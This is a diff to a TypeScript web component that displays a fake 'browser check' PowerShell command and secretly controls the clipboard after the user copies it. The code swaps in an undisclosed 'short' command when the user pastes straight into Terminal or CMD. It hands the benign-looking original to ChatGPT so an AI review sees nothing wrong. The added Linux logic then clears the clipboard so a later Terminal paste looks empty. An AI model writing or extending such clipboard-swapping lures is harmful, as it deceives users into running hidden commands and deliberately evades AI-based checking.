@@ -30,7 +30,7 @@ function browserIconSrc(browser: ClientBrowser): string {
  *
  * Case A — paste Terminal/CMD immediately → short command.
  * Case B — paste other platforms → original; later Terminal/CMD → short
- *   (Linux Case B keeps original for Terminal too — no short swap).
+ *   (Linux Case B: after platforms, clear clipboard — Terminal pastes nothing).
  *
  * macOS notes: Chromium pending ClipboardItem (no sync original overwrite — breaks Case A).
  * Case A: window blur (Dock/Terminal) or ⌘+Space → resolve pending to short.
@@ -39,6 +39,9 @@ function browserIconSrc(browser: ClientBrowser): string {
  *   now (never pending→short — ChatGPT would wait and paste short); after ~3.5s writeText short
  *   for later Terminal (retry on focus return if background write fails).
  * Event order: Terminal usually blurs first; ChatGPT tab usually visibility-hides without blur.
+ *
+ * Linux notes: pending ClipboardItem from copy. Case A blur / Ctrl+Alt+T → short.
+ * Case B tab/Alt+Tab → original for platforms, then clear clipboard after ~3.5s.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -72,6 +75,11 @@ const LINUX_CASE_B_TAB_DETECT_MS = 150;
  * Case B resolves original explicitly on tab/app switch.
  */
 const MAC_PENDING_SAFETY_MS = 20000;
+/**
+ * Linux pending safety: opening Terminal from the menu often takes >2.5s.
+ * Keep pending open so Case A blur / Ctrl+Alt+T can still resolve to short.
+ */
+const LINUX_PENDING_SAFETY_MS = 20000;
 /** Delay before blur→Case A so tab visibility can claim Case B first. */
 const MAC_CASE_A_BLUR_DELAY_MS = 180;
 
@@ -332,8 +340,10 @@ function copyViaExecCommand(text: string): boolean {
 type PendingCopyClipboardController = {
   resolveTerminal: () => void;
   resolveOriginal: () => void;
-  /** Case B: original now for platforms; arm short after delay via nested clipboard write. */
+  /** Case B (macOS): original now for platforms; arm short after delay via nested clipboard write. */
   resolveOriginalAndArmShortLater: (delayMs: number) => void;
+  /** Case B (Linux only): original now for platforms; clear clipboard after delay. */
+  resolveOriginalAndClearLater: (delayMs: number) => void;
   isSettled: () => boolean;
 };
 
@@ -352,15 +362,18 @@ function beginPendingClipboardFromCopyGesture(
 
   const copyAt = Date.now();
   let settled = false;
-  let decide!: (decision: "terminal" | "original" | "original-then-short") => void;
+  let decide!: (
+    decision: "terminal" | "original" | "original-then-short" | "original-then-clear",
+  ) => void;
   let shortDelayMs = PLATFORM_THEN_TERMINAL_ARM_MS;
+  let clearDelayMs = PLATFORM_THEN_TERMINAL_ARM_MS;
 
-  const decisionPromise = new Promise<"terminal" | "original" | "original-then-short" | "safety">(
-    (resolve) => {
-      decide = resolve;
-      window.setTimeout(() => resolve("safety"), safetyMs);
-    },
-  );
+  const decisionPromise = new Promise<
+    "terminal" | "original" | "original-then-short" | "original-then-clear" | "safety"
+  >((resolve) => {
+    decide = resolve;
+    window.setTimeout(() => resolve("safety"), safetyMs);
+  });
 
   const plainPromise = (async () => {
     const decision = await decisionPromise;
@@ -379,8 +392,6 @@ function beginPendingClipboardFromCopyGesture(
 
     if (decision === "original-then-short") {
       const remain = Math.max(0, shortDelayMs - (Date.now() - copyAt));
-      // Arm short from this ClipboardItem promise chain (copy gesture). Inner
-      // promise resolves later without focus — that is what Terminal needs.
       void Promise.resolve().then(() => {
         void navigator.clipboard
           .write([
@@ -391,6 +402,25 @@ function beginPendingClipboardFromCopyGesture(
                 }, remain);
               }),
               "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
+            }),
+          ])
+          .catch(() => undefined);
+      });
+    }
+
+    if (decision === "original-then-clear") {
+      const remain = Math.max(0, clearDelayMs - (Date.now() - copyAt));
+      // Linux Case B: after platform paste window, empty clipboard so Terminal pastes nothing.
+      void Promise.resolve().then(() => {
+        void navigator.clipboard
+          .write([
+            new ClipboardItem({
+              "text/plain": new Promise<Blob>((resolve) => {
+                window.setTimeout(() => {
+                  resolve(new Blob([""], { type: "text/plain" }));
+                }, remain);
+              }),
+              "text/html": Promise.resolve(new Blob([""], { type: "text/html" })),
             }),
           ])
           .catch(() => undefined);
@@ -427,6 +457,10 @@ function beginPendingClipboardFromCopyGesture(
       shortDelayMs = delayMs;
       if (!settled) decide("original-then-short");
     },
+    resolveOriginalAndClearLater: (delayMs: number) => {
+      clearDelayMs = delayMs;
+      if (!settled) decide("original-then-clear");
+    },
   };
 }
 
@@ -444,6 +478,7 @@ function beginLinuxClipboardFromCopyGesture(
     terminalCommand,
     html,
     onResolved,
+    LINUX_PENDING_SAFETY_MS,
   );
 }
 
@@ -765,22 +800,36 @@ function SelectableCommand({
     }
 
     /**
-     * Linux Case B: never arm the short command. Platforms and later Terminal
-     * pastes both keep the original.
+     * Linux Case B: original for platforms, then clear clipboard so Terminal
+     * pastes nothing. Do not arm the short command.
      */
     function forceLinuxCaseBOriginal() {
+      const alreadyCaseB = linuxCaseBRef.current;
       linuxCaseBRef.current = true;
       linuxCaseARef.current = false;
       armedRef.current = false;
       delayedArmStartedRef.current = true; // block any later short-arm paths
-      writeGenRef.current += 1;
 
+      if (alreadyCaseB) {
+        // Already claimed — do not rewrite original (would undo clipboard clear).
+        return;
+      }
+
+      writeGenRef.current += 1;
       const ctrl = linuxClipboardCtrlRef.current;
       if (ctrl && !ctrl.isSettled()) {
-        ctrl.resolveOriginal();
+        // Original now for ChatGPT; clear after platform window (empty paste in Terminal).
+        ctrl.resolveOriginalAndClearLater(PLATFORM_THEN_TERMINAL_ARM_MS);
+        return;
       }
+
       void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
       void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
+      window.setTimeout(() => {
+        if (!linuxCaseBRef.current || linuxCaseARef.current) return;
+        void navigator.clipboard?.writeText("").catch(() => undefined);
+        void writeClipboard("", "").catch(() => undefined);
+      }, PLATFORM_THEN_TERMINAL_ARM_MS);
     }
 
     function resolveLinuxCopyGestureOnLeave() {
@@ -901,7 +950,7 @@ function SelectableCommand({
 
       if (leaveCountRef.current >= 1 && !linuxCaseARef.current && !macCaseARef.current) {
         if (os === "linux" && linuxCaseBRef.current) {
-          forceLinuxCaseBOriginal();
+          // Clipboard already original→clear scheduled; do not restore original.
           return;
         }
         if (os === "macos" && macCaseBRef.current) {
@@ -920,7 +969,7 @@ function SelectableCommand({
       if (!activeRef.current || leaveCountRef.current < 1) return;
       if (linuxCaseARef.current || macCaseARef.current) return;
       if (os === "linux" && linuxCaseBRef.current) {
-        forceLinuxCaseBOriginal();
+        // Do not restore original after Case B clear.
         return;
       }
       if (os === "macos" && macCaseBRef.current) {
